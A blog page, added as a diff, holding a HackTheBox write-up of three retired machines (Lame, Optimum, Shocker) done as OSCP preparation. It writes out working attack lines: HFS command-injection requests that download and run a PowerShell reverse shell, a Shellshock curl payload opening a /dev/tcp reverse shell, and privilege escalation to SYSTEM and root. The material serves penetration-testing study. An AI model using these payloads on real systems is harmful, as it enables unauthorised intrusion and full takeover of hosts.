@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="map[name:virtualtack]">
+<meta name="description" content="Walkthrough write-up of the Lame, Optimum, Shocker HackTheBox CTFs" />
+<meta name="keywords" content="cybersecurity, hacking, tryhackme, blog, SMB, CVE-2007-2447, Rejetto, HFS, Sherlock, Nishang, shellshock, Bash, Perl" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://robscharf.github.io/writeups/january-23-2023/" />
+
+    <title>
+        robscharf@github
+    </title>
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://robscharf.github.io/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://robscharf.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://robscharf.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://robscharf.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://robscharf.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://robscharf.github.io/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://robscharf.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="HTB Easy Round-Up (Part 2): Lame, Optimum, Shocker -- Write-Ups">
+<meta itemprop="description" content="Walkthrough write-up of the Lame, Optimum, Shocker HackTheBox CTFs"><meta itemprop="datePublished" content="2023-01-23T10:25:00+00:00" />
+<meta itemprop="dateModified" content="2023-01-23T10:25:00+00:00" />
+<meta itemprop="wordCount" content="2228"><meta itemprop="image" content="https://robscharf.github.io/"/>
+<meta itemprop="keywords" content="SMB,CVE-2007-2447,Rejetto,HFS,Sherlock,Nishang,shellshock,Bash,Perl," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://robscharf.github.io/"/>
+
+<meta name="twitter:title" content="HTB Easy Round-Up (Part 2): Lame, Optimum, Shocker -- Write-Ups"/>
+<meta name="twitter:description" content="Walkthrough write-up of the Lame, Optimum, Shocker HackTheBox CTFs"/>
+
+
+
+
+    <meta property="og:title" content="HTB Easy Round-Up (Part 2): Lame, Optimum, Shocker -- Write-Ups" />
+<meta property="og:description" content="Walkthrough write-up of the Lame, Optimum, Shocker HackTheBox CTFs" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://robscharf.github.io/writeups/january-23-2023/" /><meta property="og:image" content="https://robscharf.github.io/"/><meta property="article:section" content="writeups" />
+<meta property="article:published_time" content="2023-01-23T10:25:00+00:00" />
+<meta property="article:modified_time" content="2023-01-23T10:25:00+00:00" />
+
+
+
+
+    <meta property="article:section" content="ctf" />
+
+    <meta property="article:section" content="HackTheBox" />
+
+    <meta property="article:section" content="TJNull List" />
+
+
+
+    <meta property="article:published_time" content="2023-01-23 10:25:00 &#43;0000 UTC" />
+
+
+
+
+
+
+<link rel="stylesheet" href='https://robscharf.github.io/style.css'>
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://robscharf.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text">(virtualtack@github)-[~] $ </span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:white;
+                   animation-duration:1.6s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://robscharf.github.io/blog">blog</a></li><li><a href="https://robscharf.github.io/cv">cv</a></li><li><a href="https://robscharf.github.io/lab">homelab</a></li><li><a href="https://robscharf.github.io/writeups">writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        11 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        HTB Easy Round-Up (Part 2): Lame, Optimum, Shocker &ndash; Write-Ups
+      </h1>
+
+      
+        <div class="post-excerpt">Walkthrough write-up of the Lame, Optimum, Shocker HackTheBox CTFs</div>
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <h2 id="about">About</h2>
+<p>This is the second installment of walkthroughs for three <em>easy</em> rated, retired HackTheBox machines. I am currently making my way through Offensive Security&rsquo;s PEN-200 course, with plans to take the OSCP exam later this year. As part of my preparations, I am working on the infamous TJNull list of OSCP prep-relevant machines across the popular CTF and training platforms. The list can be found <a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit?usp=sharing">here</a>.</p>
+<p>At this moment, I have completed 17 HTB machines from the TJNull list and I am approximately 30% of the way through PEN-200, with all course exercises finished for the first 10 sections of the course.</p>
+<p><br/><br/>
+<strong>Note:</strong> I have replaced all instances of the target virtual machine&rsquo;s ip addresses with <code>&lt;target-ip&gt;</code> (and my own Kali ip address with <code>&lt;kali-ip&gt;</code> ) throughout this write-up.</p>
+<h2 id="lame">Lame</h2>
+<p>Rooting this box involves the discovery and exploitation of an obsolete SMB share via MS-RPC calls containing unfiltered user input via a username mapping script built in to the software.</p>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="nmap">nmap</h4>
+<p>Our nmap host scan returns the following services:</p>
+<pre tabindex="0"><code>21/tcp  open  ftp         syn-ack ttl 63 vsftpd 2.3.4
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.14.4
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+
+22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+
+139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+
+445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+</code></pre><p>Digging deeper into the Samba SMB shares via nmap&rsquo;s scripting engine, we glean the following:</p>
+<pre tabindex="0"><code>| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+|   Computer name: lame
+|   NetBIOS computer name: 
+|   Domain name: hackthebox.gr
+|   FQDN: lame.hackthebox.gr
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	tmp             Disk      oh noes!
+	opt             Disk
+	IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
+	ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
+</code></pre><p>As anonymous logins are permitted, we investigate the shares, especially the <code>tmp/</code> directory, though ultimately nothing of value is located.</p>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="known-vulnerability---cve-2007-2447">Known vulnerability - CVE-2007-2447</h3>
+<p>While none of the contents of the SMB shares give us a path onto the box, searching ExploitDB for the service version (<code>Samba 3.0.20</code>) returns several results, though none are directly useful. Instead, further research of Samba 3.0.20 yields <a href="https://github.com/amriunix/CVE-2007-2447">CVE-2007-2447</a>. This script <a href="https://amriunix.com/post/cve-2007-2447-samba-usermap-script/">exploits a weakness in Samba 3.0.0 - 3.0.25rc3</a> that allows for unathenticated RCE via the use of usernames that contain shell meta characters.</p>
+<pre tabindex="0"><code>$ python2 usermap_script.py
+[*] CVE-2007-2447 - Samba usermap script
+[-] usage: python usermap_script.py &lt;RHOST&gt; &lt;RPORT&gt; &lt;LHOST&gt; &lt;LPORT&gt;
+</code></pre><p>The script is very easy to use and immediately provides us with <code>root</code> access to the box.</p>
+<pre tabindex="0"><code>$ nc -lvnp 8008
+listening on [any] 8008 ...
+connect to [&lt;kali-ip&gt;] from (UNKNOWN) [&lt;target-ip&gt;] 41884
+whoami
+root
+</code></pre><h2 id="optimum">Optimum</h2>
+<p>Optimum is a Windows box with a Rejetto HFS vulnerability that allows for unauthenticated RCE. From the initial foothold, we are able to use Sherlock to identify the MS16-032 vulnerability, which, in turn, gives us <code>SYSTEM</code> access.</p>
+<h3 id="enumeration-1">Enumeration</h3>
+<h4 id="nmap-1">nmap</h4>
+<p>Our nmap scans reveal the following HTTP server running on the host box:</p>
+<pre tabindex="0"><code>80/tcp open  http    syn-ack ttl 127 HttpFileServer httpd 2.3
+|_http-title: HFS /
+|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-server-header: HFS 2.3
+</code></pre><p>Visiting the web root, we find the following, which we identify as <code>HFS - HTTP File Server</code>, also known as a <code>rejetto</code> project:
+<a href="http://www.rejetto.com/hfs/">http://www.rejetto.com/hfs/</a></p>
+<p><img src="https://robscharf.github.io/images/optimum/hfs.png" alt=""></p>
+<h2 id="foothold">Foothold</h2>
+<p>Googling <code>Rejetto HTTP File Server Exploit</code> gives us a <a href="https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec/">Rapid7 page</a> explaining the method of exploitation:</p>
+<blockquote>
+<p>Rejetto HttpFileServer (HFS) is vulnerable to remote command execution attack due to a poor regex in the file ParserLib.pas.  This module exploits the HFS scripting commands by using &lsquo;%00&rsquo; to bypass the filtering. This module has been tested successfully on HFS 2.3b over Windows XP SP3, Windows 7 SP1 and Windows 8.</p>
+</blockquote>
+<p>At this point, we could either choose to employ Metasploit, or exploit the service manually. We will do the latter, in the spirit of OSCP preparations.</p>
+<p>We first familiarize ourselves with HFS commands. This can be easily done via the official documentation, located here:  <a href="https://www.rejetto.com/wiki/index.php/HFS:_scripting_commands">https://www.rejetto.com/wiki/index.php/HFS:_scripting_commands</a></p>
+<pre tabindex="0"><code>exec | A
+    ask system to run file A, eventually with parameters. If you need to use the pipe, then use macro quoting.
+    Optional parameter out will let you capture the console output of the program in the variable specified by name.
+    Optional parameter timeout will specify the max number of seconds the app should be left running.
+    Example: {.exec|notepad.}
+</code></pre><p>So with <code>Example: {.exec|notepad.}</code> in hand, we can open Burp and capture a request to begin.</p>
+<h3 id="burp">Burp</h3>
+<p>Here is our request, populated with one null byte in the query:</p>
+<pre tabindex="0"><code>GET /?search=%00 HTTP/1.1
+Host: &lt;target-ip&gt;
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://&lt;target-ip&gt;/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: HFS_SID=0.878811701899394
+Connection: close
+</code></pre><p>Let&rsquo;s try to use the <code>{.exec|notepad.}</code> syntax to try to ping our attacking machine with the <code>ping</code> utility.</p>
+<p>Our request is:</p>
+<pre tabindex="0"><code>GET /?search=%00{.exec|ping+&lt;kali-ip&gt;.} HTTP/1.1
+</code></pre><p><strong>Note:</strong> Remember that these commands <em>must</em> be URL encoded (Burp shortcut: <code>CTRL+U</code>).</p>
+<p>We then fire up <code>tcpdump</code> to monitor incoming traffic and check for the ping.</p>
+<p><code>sudo tcpdump -i tun0</code></p>
+<pre tabindex="0"><code>$ sudo tcpdump -i tun0
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+
+15:53:52.835671 IP kali-bot.57694 &gt; &lt;target-ip&gt;.http: Flags [S], seq 1188628820, win 64240, options [mss 1460,sackOK,TS val 4150609100 ecr 0,nop,wscale 7], length 0
+
+15:53:52.852623 IP &lt;target-ip&gt;.http &gt; kali-bot.57694: Flags [S.], seq 1785899650, ack 1188628821, win 8192, options [mss 1337,nop,wscale 8,sackOK,TS val 5969016 ecr 4150609100], length 0
+
+15:53:52.852642 IP kali-bot.57694 &gt; &lt;target-ip&gt;.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 4150609117 ecr 5969016], length 0
+
+15:53:52.852825 IP kali-bot.57694 &gt; &lt;target-ip&gt;.http: Flags [P.], seq 1:525, ack 1, win 502, options [nop,nop,TS val 4150609117 ecr 5969016], length 524: HTTP: GET /?search=%2500{.exec|ping+&lt;kali-ip&gt;.} HTTP/1.1
+
+15:53:52.889119 IP &lt;target-ip&gt;.http &gt; kali-bot.57694: Flags [P.], seq 1:194, ack 525, win 258, options [nop,nop,TS val 5969020 ecr 4150609117], length 193: HTTP: HTTP/1.1 200 OK
+</code></pre><p>The ping works! Let&rsquo;s see if we can turn this into a reverse shell with Nishang&rsquo;s <code>Invoke PowerShell shell via TCP</code> script.</p>
+<h3 id="nishang-reverse-shell">Nishang Reverse Shell</h3>
+<p><strong>Copy Nishang reverse shell</strong></p>
+<pre tabindex="0"><code>cp /home/virtualtack/tools/shells/reverse-shells/nishang/Invoke-PowerShellTcp.ps1   .
+</code></pre><p>We need to open the script file and add our reverse shell command to be invoked:</p>
+<p><code>Invoke-PowerShellTcp.ps1</code></p>
+<pre tabindex="0"><code>Invoke-PowerShellTcp -Reverse -IPAddress &lt;kali-ip&gt; -Port 8001
+</code></pre><p>Now, back in Burp, we need to instruct the server to download the Nishang script and execute it (once again with a URL-encoded request):</p>
+<pre tabindex="0"><code>GET /?search=%00{.exec|C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString(&#39;http://&lt;kali-ip&gt;:8000/Invoke-PowerShellTcp.ps1&#39;).} HTTP/1.1
+</code></pre><p><strong>Note:</strong> We need to leverage the 64-bit version of PowerShell that resides at <code>C:\Windows\SysNative\PowerShell.exe</code></p>
+<p>After URL encoding, our request looks like:</p>
+<pre tabindex="0"><code>GET /?search=%00{.exec|c%3a\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString(&#39;http%3a//&lt;kali-ip&gt;%3a8000/Invoke-PowerShellTcp.ps1&#39;).} HTTP/1.1
+</code></pre><pre tabindex="0"><code>$ nc -lvnp 8001
+listening on [any] 8001 ...
+connect to [&lt;kali-ip&gt;] from (UNKNOWN) [&lt;target-ip&gt;] 49203
+Windows PowerShell running as user kostas on OPTIMUM
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+ 
+whoami      
+optimum\kostas
+</code></pre><h3 id="privesc">PrivEsc</h3>
+<p>Owing to the age of the machine, we opt to employ a Sherlock scan to help us identify vulnerabilities that will allow us to escalate our privileges to <code>SYSTEM</code>. To make this quicker, we can simply add the relevant <code>Find-AllVulns</code> function call to the end of the <code>Sherlock.ps1</code> script file to allow for immediate execution.</p>
+<p><strong>Search <code>Sherlock.ps1</code> for functions</strong></p>
+<pre tabindex="0"><code>grep -i function Sherlock.ps1
+</code></pre><pre tabindex="0"><code>$ grep -i function Sherlock.ps1
+function Get-FileVersionInfo ($FilePath) {
+function Get-InstalledSoftware($SoftwareName) {
+function Get-Architecture {
+function Get-CPUCoreCount {
+function New-ExploitTable {
+function Set-ExploitTable ($MSBulletin, $VulnStatus) {
+function Get-Results {
+👍function Find-AllVulns 👍{
+function Find-MS10015 {
+function Find-MS10092 {
+function Find-MS13053 {
+function Find-MS13081 {
+function Find-MS14058 {
+function Find-MS15051 {
+function Find-MS15078 {
+function Find-MS16016 {
+function Find-MS16032 {
+function Find-MS16034 {
+function Find-CVE20177199 {
+function Find-MS16135 {
+</code></pre><p><strong>Add <code>Find-AllVulns</code> command to end of script</strong></p>
+<pre tabindex="0"><code>Find-AllVulns
+</code></pre><p>We can then serve the script from our Kali machine and subsequently download it on the remote host.</p>
+<p><strong>Download Sherlock</strong> via PowerShell</p>
+<pre tabindex="0"><code>IEX(New-Object Net.Webclient).downloadString(&#39;http://&lt;kali-ip&gt;:8000/Sherlock.ps1&#39;)
+</code></pre><p><strong>results of <code>Sherlock.ps1</code></strong></p>
+<pre tabindex="0"><code>PS C:\Users\kostas\Desktop&gt; IEX(New-Object Net.Webclient).downloadString(&#39;http://&lt;kali-ip&gt;:8000/Sherlock.ps1&#39;)
+
+
+Title      : User Mode to Ring (KiTrap0D)
+MSBulletin : MS10-015
+CVEID      : 2010-0232
+Link       : https://www.exploit-db.com/exploits/11199/
+VulnStatus : Not supported on 64-bit systems
+
+Title      : Task Scheduler .XML
+MSBulletin : MS10-092
+CVEID      : 2010-3338, 2010-3888
+Link       : https://www.exploit-db.com/exploits/19930/
+VulnStatus : Not Vulnerable
+
+✂️ ................................ ✂️
+
+Title      : Secondary Logon Handle
+MSBulletin : MS16-032
+CVEID      : 2016-0099
+Link       : https://www.exploit-db.com/exploits/39719/
+VulnStatus : Appears Vulnerable
+
+✂️ ................................ ✂️
+
+Title      : Nessus Agent 6.6.2 - 6.10.3
+MSBulletin : N/A
+CVEID      : 2017-7199
+Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
+             tml
+VulnStatus : Not Vulnerable
+</code></pre><pre tabindex="0"><code>Title      : Secondary Logon Handle
+MSBulletin : MS16-032
+CVEID      : 2016-0099
+Link       : https://www.exploit-db.com/exploits/39719/
+VulnStatus : Appears Vulnerable
+
+Title      : Windows Kernel-Mode Drivers EoP
+MSBulletin : MS16-034
+CVEID      : 2016-0093/94/95/96
+Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
+             6-034?
+VulnStatus : Appears Vulnerable
+
+Title      : Win32k Elevation of Privilege
+MSBulletin : MS16-135
+CVEID      : 2016-7255
+Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
+             ample-Exploits/MS16-135
+VulnStatus : Appears Vulnerable
+</code></pre><p>Unfortunately, scripts written for <code>MS16-032</code> usually require interactivity and we don&rsquo;t have an interactive terminal. The exploit involves GUI elements. However, Empire has a pre-packed script for just this occasion!</p>
+<p>You can read about <code>Invoke-MS16032.ps1</code> via InfosecMatter <a href="https://www.infosecmatter.com/empire-module-library/?mod=powershell/privesc/ms16-032">here</a>. In short, this is a race-condition vulnerability, which means that a) the remote host must utilize 2+ CPU cores and b) the exploit may occasionally unexpectedly fail. More information on MS16-032 can be found via Google&rsquo;s Project Zero: <a href="https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html">https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html</a></p>
+<p>We copy the exploit to our local directory with:</p>
+<pre tabindex="0"><code>cp /usr/share/powershell-empire/empire/server/data/module_source/privesc/Invoke-MS16032.ps1 .
+</code></pre><p>&hellip;and add the function call to the end of the script:</p>
+<pre tabindex="0"><code>Invoke-MS16032 -Command &#34;iex(New-Object Net.WebClient).DownloadString(&#39;http://&lt;kali-ip&gt;:8000/shell.ps1&#39;)&#34;
+</code></pre><p>This calls a copy of our previous <code>Invoke-PowerShellTcp.ps1</code> reverse shell script, which will be executed with privileged permissions due to the MS16-032 vulnerability.</p>
+<p>After setting up a quick python server, we are then ready to download and execute the exploitation script via PowerShell on the remote host:</p>
+<pre tabindex="0"><code>IEX(New-Object Net.WebClient).downloadString(&#39;http://&lt;kali-ip&gt;:8000/Invoke-MS16032.ps1&#39;)
+</code></pre><pre tabindex="0"><code>PS C:\Users\kostas\Desktop&gt; IEX(New-Object Net.WebClient).downloadString(&#39;http://&lt;kali-ip&gt;:8000/Invoke-MS16032.ps1&#39;)
+		__ __ ___ ___   ___     ___ ___ ___ 
+	|  V  |  _|_  | |  _|___|   |_  |_  |
+	|     |_  |_| |_| . |___| | |_  |  _|
+	|_|_|_|___|_____|___|   |___|___|___|
+										
+					[by b33f -&gt; @FuzzySec]
+
+[!] Holy handle leak Batman, we have a SYSTEM shell!!
+</code></pre><pre tabindex="0"><code>$ rlwrap nc -lvnp 8011
+listening on [any] 8011 ...
+connect to [&lt;kali-ip&gt;] from (UNKNOWN) [&lt;target-ip&gt;] 49248
+Windows PowerShell running as user OPTIMUM$ on OPTIMUM
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+whoami
+nt authority\system
+</code></pre><h2 id="shocker">Shocker</h2>
+<p>Shocker, another venerable HTB box, features the Shellshock Bash vulnerability, which is paired with a relatively simple <code>sudo</code>-based prvilege escalation vector.</p>
+<h3 id="enumeration-2">Enumeration</h3>
+<p>As usual, we begin with nmap scans to identify our attack surface.</p>
+<h4 id="nmap-2">nmap</h4>
+<pre tabindex="0"><code>80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
+|_http-date: Sat, 10 Dec 2022 01:43:13 GMT; -2s from local time.
+
+2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+</code></pre><p>As the web root did not turn up anything actionable via manual browsing, we turn to Feroxbuster for content discovery.</p>
+<h3 id="feroxbuster">feroxbuster</h3>
+<pre tabindex="0"><code>403      GET       11l       32w      294c http://&lt;target-ip&gt;/cgi-bin/
+403      GET       11l       32w      299c http://&lt;target-ip&gt;/cgi-bin/.html
+</code></pre><p>In consideration of the box&rsquo;s name, I began with the suspicion that we would encounter the famous Shellshock vulnerability. More information on this Bash vulnerability, which affects versions 1.0.3–4.3, can be found here: <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271</a> and here: <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">https://en.wikipedia.org/wiki/Shellshock_(software_bug)</a>.</p>
+<p>Additional content discovery efforts reveal the <code>user.sh</code> script file within the <code>/cgi-bin/</code> directory.</p>
+<pre tabindex="0"><code>feroxbuster -u http://&lt;target-ip&gt;/cgi-bin/ -x htm,html,js,php,txt,json,zip,bak,pdf,docx,conf,py,js,sh,cgi,pl | tee cgi-feroxbuster.txt
+</code></pre><pre tabindex="0"><code>200      GET        7l       18w        0c http://&lt;target-ip&gt;/cgi-bin/user.sh
+</code></pre><p>From here, we can use a curl request to confirm that the server is vulnerable:</p>
+<pre tabindex="0"><code>virtualtack@virtualshack ~/htb/shocker [±main U:2 ?:56 ✗] curl -A &#34;() { :;}; echo Content-Type: text/html; echo; /usr/bin/whoami;&#34; http://&lt;target-ip&gt;/cgi-bin/user.sh
+shelly
+</code></pre><p>Excellent! Now we can modify our request payload to contain shellcode, giving us a reverse shell.</p>
+<h2 id="foothold-1">Foothold</h2>
+<p><code>curl -A &quot;() { :;}; echo Content-Type: text/html; echo; /bin/sh -i &gt;&amp; /dev/tcp/&lt;kali-ip&gt;/9999 0&gt;&amp;1;&quot; http://&lt;target-ip&gt;/cgi-bin/user.sh</code></p>
+<pre tabindex="0"><code>virtualtack@virtualshack ~/htb/shocker [±main U:2 ?:56 ✗] nc -lvnp 9999
+listening on [any] 9999 ...
+connect to [&lt;kali-ip&gt;] from (UNKNOWN) [&lt;target-ip&gt;] 49184
+/bin/sh: 0: can&#39;t access tty; job control turned off
+$ whoami
+shelly
+</code></pre><h2 id="privesc-1">PrivEsc</h2>
+<p>Luckily, the privilege escalation vector is simple. As one of our standard, initial checks after obtaining user access, we check to see which commands and/or binaries can be run by our user with <code>root</code> permissions.</p>
+<pre tabindex="0"><code>$ sudo -l
+Matching Defaults entries for shelly on Shocker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User shelly may run the following commands on Shocker:
+    (root) NOPASSWD: /usr/bin/perl
+</code></pre><p>Thus, the <code>shelly</code> user account has been configured to run the <code>perl</code> binary locate din <code>/usr/bin/</code> with <code>root</code> privileges, all without needing the account password. From here, a <a href="https://gtfobins.github.io/gtfobins/perl/">quick GTFOBins check</a> reveals that we simply need to run <code>sudo perl -e 'exec &quot;/bin/sh&quot;;'</code> to spawn a shell session with full access.</p>
+<pre tabindex="0"><code>$ sudo -l
+Matching Defaults entries for shelly on Shocker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User shelly may run the following commands on Shocker:
+    (root) NOPASSWD: /usr/bin/perl
+$ sudo perl -e &#39;exec &#34;/bin/sh&#34;;&#39;
+whoami
+root
+</code></pre><h2 id="lessons-learned">Lessons Learned</h2>
+<p>This round of TJNull boxes provided excellent opportunities for review.</p>
+<ul>
+<li>Lame
+<ul>
+<li>This was my first exposure to CVE-2007-2447.</li>
+<li>It was also a nice reminder that SMB shares that allow <code>anonymous</code> access do not always contain files that will lead to a foothold. Instead, the service itself can be vulnerable!</li>
+</ul>
+</li>
+<li>Optimum
+<ul>
+<li>This was the first time that I needed to use HFS scripting, and the syntax was not immediately intuitive to me.</li>
+</ul>
+</li>
+<li>Shocker
+<ul>
+<li>While I have encountered the Shellshock vulnerability previously, the name of the script file(s) in <code>/cgi-bin/</code> differed. This reinforced the importance of thorough content discovery/directory busting.</li>
+</ul>
+</li>
+</ul>
+
+      </div>
+    </article>
+
+ 
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://robscharf.github.io/tags/smb/">SMB</a></span>
+        <span class="tag"><a href="https://robscharf.github.io/tags/cve-2007-2447/">CVE-2007-2447</a></span>
+        <span class="tag"><a href="https://robscharf.github.io/tags/rejetto/">Rejetto</a></span>
+        <span class="tag"><a href="https://robscharf.github.io/tags/hfs/">HFS</a></span>
+        <span class="tag"><a href="https://robscharf.github.io/tags/sherlock/">Sherlock</a></span>
+        <span class="tag"><a href="https://robscharf.github.io/tags/nishang/">Nishang</a></span>
+        <span class="tag"><a href="https://robscharf.github.io/tags/shellshock/">shellshock</a></span>
+        <span class="tag"><a href="https://robscharf.github.io/tags/bash/">Bash</a></span>
+        <span class="tag"><a href="https://robscharf.github.io/tags/perl/">Perl</a></span>
+        
+    </p>
+
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://robscharf.github.io/categories/ctf/">ctf</a></span>
+        <span class="tag"><a href="https://robscharf.github.io/categories/hackthebox/">HackTheBox</a></span>
+        <span class="tag"><a href="https://robscharf.github.io/categories/tjnull-list/">TJNull List</a></span>
+        
+    </p>
+
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        2228 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2023-01-23 02:25
+        
+
+         
+          
+        
+      </p>
+    </div>
+
+    
+    <div class="pagination">
